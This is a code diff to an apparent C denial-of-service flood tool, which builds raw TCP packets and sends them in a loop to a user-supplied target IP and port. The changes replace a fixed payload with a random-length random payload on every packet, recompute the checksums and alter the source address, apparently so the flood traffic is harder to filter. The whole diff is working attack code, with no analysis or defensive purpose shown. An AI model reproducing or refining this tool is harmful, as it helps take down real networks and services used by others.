@@ -23,7 +23,7 @@ volatile int limiter;
 volatile unsigned int pps;
 volatile unsigned int sleeptime = 100;
 
-static const char PAYLOAD[] = "\x7e\xb0\xb0\x53\x46\x7e\xb0\x53\x05\x0a\x7e\xb0\x7e\xb0\x53\x46\x7e\xb0\x53\x47\x0a\x7e\xb0\x53\x46\xb0\x53\x46\x7e\xb0\xb0";
+static const char PAYLOAD[] = "\x7e\xb0\xb0\x53\x46\x7e\xb0\x53\x05\x0a\x7e\xb0\x7e\xb0\x53\x46\x5e\x7e\xb0\x53\x47\x0a\x7e\xb0\x53\x46\xb0\x53\x46\x7e\xb0\xb0\xb0\x7e\xb0\x53\x46\x5e";
 
 void init_rand(unsigned long int x)
 {
@@ -138,7 +138,7 @@ void setup_ip_header(struct iphdr *iph)
 	iph->ttl = MAXTTL;
 	iph->protocol = IPPROTO_TCP;
 	iph->check = 0;
-	iph->saddr = inet_addr("127.0.0.1");
+	iph->saddr = inet_addr("0.0.0.0");
 }
 
 void setup_tcp_header(struct tcphdr *tcph)
@@ -155,18 +155,18 @@ void setup_tcp_header(struct tcphdr *tcph)
 	memcpy((void *)tcph + sizeof(struct tcphdr), PAYLOAD, sizeof(PAYLOAD) - 1);
 }
 
-char *genPayload(char oldPayload[], size_t size, int limit)
+char *genPayload(char oldPayload[], size_t size)
 {
-	for (size_t i = 0; i < limit; i++)
+	for (int i = 0; i < randnum(16, size); i++)
 	{
 		for (size_t num = 0; num < size / 2; num++)
 		{
-			oldPayload[num] = randnum(1, 128);
+			oldPayload[num] = randnum(1, size);
 			oldPayload[i] = rand_cmwc() % oldPayload[num];
 		}
 	}
 
-	//printf("Payload: %s\n", oldPayload);
+	// printf("Payload: %s\n", oldPayload);
 	return oldPayload;
 }
 
@@ -218,6 +218,17 @@ void *flood(void *par1)
 	i = 0;
 	while (1)
 	{
+
+		int randomPayloadLength = randnum(32, 512) - 1;
+		char randomPayload[randomPayloadLength];
+
+		for (int i = 0; i < randomPayloadLength; i++)
+		{
+			randomPayload[i] = rand_cmwc() % 256;
+		}
+		memcpy((void *)tcph + sizeof(struct tcphdr), randomPayload, randomPayloadLength);
+		iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + randomPayloadLength;
+		iph->check = csum((unsigned short *)datagram, iph->tot_len);
 		tcph->check = 0;
 		tcph->seq = htonl(rand_cmwc() & 0xFFFFFFFFF);
 		tcph->doff = sizeof(struct tcphdr) / 4;
@@ -228,7 +239,7 @@ void *flood(void *par1)
 		iph->check = csum((unsigned short *)datagram, sizeof(struct iphdr));
 		tcph->source = htons(rand_cmwc() & 0xFFFF);
 		tcph->dest = htons(floodport);
-		tcph->check = tcpcsum(iph, tcph, sizeof(PAYLOAD) - 1);
+		tcph->check = tcpcsum(iph, tcph, randomPayloadLength);
 
 		if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
 		{
@@ -238,11 +249,7 @@ void *flood(void *par1)
 		int windows[3] = {8192, 64240, 65535};
 		int ctos[3] = {0, 40, 72};
 		iph->tos = ctos[randnum(0, 2)];
-		char stronka[] = "\x7e\xb0\xb0\x53\x46\x7e\xb0\x53\x05\x0a\x7e\xb0\x7e\xb0\x53\x46\x7e\xb0\x53\x47\x0a\x7e\xb0\x53\x46\xb0\x53\x46\x7e\xb0\xb0";
 		tcph->window = htons(windows[randnum(0, 2)]);
-		const char *newpayload = genPayload(stronka, sizeof(stronka), randnum(1, (sizeof(stronka))));
-		memcpy((void *)tcph + sizeof(struct tcphdr), newpayload, sizeof(newpayload) - 1);
-
 		pps++;
 		if (i >= limiter)
 		{
@@ -261,7 +268,7 @@ int main(int argc, char *argv[])
 		fprintf(stderr, "Usage: %s <target IP> <port> <threads> <pps limiter, -1 for no limit> <time>\n", argv[0]);
 		exit(-1);
 	}
-
+	srand((unsigned int)time(NULL));
 	fprintf(stdout, "Setting up Sockets...\n");
 	int num_threads = atoi(argv[3]);
 	floodport = atoi(argv[2]);
